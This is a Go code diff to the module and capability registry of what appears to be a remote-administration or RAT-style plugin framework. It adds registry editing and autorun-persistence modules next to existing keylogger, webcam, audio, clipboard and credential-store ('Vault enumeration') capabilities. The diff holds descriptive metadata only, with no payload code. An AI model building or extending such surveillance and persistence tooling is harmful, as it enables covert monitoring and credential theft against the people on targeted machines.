@@ -134,21 +134,23 @@ var (
 	knownApprovalStates = []PluginApprovalStatus{ApprovalPending, ApprovalApproved, ApprovalRejected}
 	knownRuntimeTypes   = []RuntimeType{RuntimeNative, RuntimeWASM}
 	semverPattern       = regexp.MustCompile(`^(0|[1-9]\d*)\.(0|[1-9]\d*)\.(0|[1-9]\d*)(?:-[0-9A-Za-z-.]+)?(?:\+[0-9A-Za-z-.]+)?$`)
-	registeredModules   = map[string]struct{}{
-		"app-vnc":         {},
-		"remote-desktop":  {},
-		"webcam-control":  {},
-		"audio-control":   {},
-		"keylogger":       {},
-		"clipboard":       {},
-		"file-manager":    {},
-		"task-manager":    {},
-		"tcp-connections": {},
-		"recovery":        {},
-		"client-chat":     {},
-		"system-info":     {},
-		"notes":           {},
-	}
+        registeredModules   = map[string]struct{}{
+                "app-vnc":         {},
+                "remote-desktop":  {},
+                "webcam-control":  {},
+                "audio-control":   {},
+                "keylogger":       {},
+                "clipboard":       {},
+                "file-manager":    {},
+                "task-manager":    {},
+                "tcp-connections": {},
+                "recovery":        {},
+                "client-chat":     {},
+                "system-info":     {},
+                "notes":           {},
+                "registry":        {},
+                "startup-manager": {},
+        }
 	registeredCapabilities = map[string]CapabilityMetadata{
 		"app-vnc.launch": {
 			ID:          "app-vnc.launch",
@@ -318,13 +320,37 @@ var (
 			Name:        "Vault enumeration",
 			Description: "Enumerate installed password managers and browser credential stores.",
 		},
-		"notes.sync": {
-			ID:          "notes.sync",
-			Module:      "notes",
-			Name:        "Notes sync",
-			Description: "Synchronize local incident notes to the operator vault with delta compression.",
-		},
-	}
+                "notes.sync": {
+                        ID:          "notes.sync",
+                        Module:      "notes",
+                        Name:        "Notes sync",
+                        Description: "Synchronize local incident notes to the operator vault with delta compression.",
+                },
+                "registry.inspect": {
+                        ID:          "registry.inspect",
+                        Module:      "registry",
+                        Name:        "registry.inspect",
+                        Description: "Enumerate registry hives, keys, and values on supported platforms.",
+                },
+                "registry.modify": {
+                        ID:          "registry.modify",
+                        Module:      "registry",
+                        Name:        "registry.modify",
+                        Description: "Create, edit, and delete registry keys and values on supported platforms.",
+                },
+                "startup.enumerate": {
+                        ID:          "startup.enumerate",
+                        Module:      "startup-manager",
+                        Name:        "startup.enumerate",
+                        Description: "Enumerate autorun entries and associated telemetry across supported operating systems.",
+                },
+                "startup.manage": {
+                        ID:          "startup.manage",
+                        Module:      "startup-manager",
+                        Name:        "startup.manage",
+                        Description: "Create, toggle, and remove autorun entries using native schedulers.",
+                },
+        }
 	registeredTelemetry = map[string]TelemetryMetadata{
 		"remote-desktop.metrics": {
 			ID:          "remote-desktop.metrics",
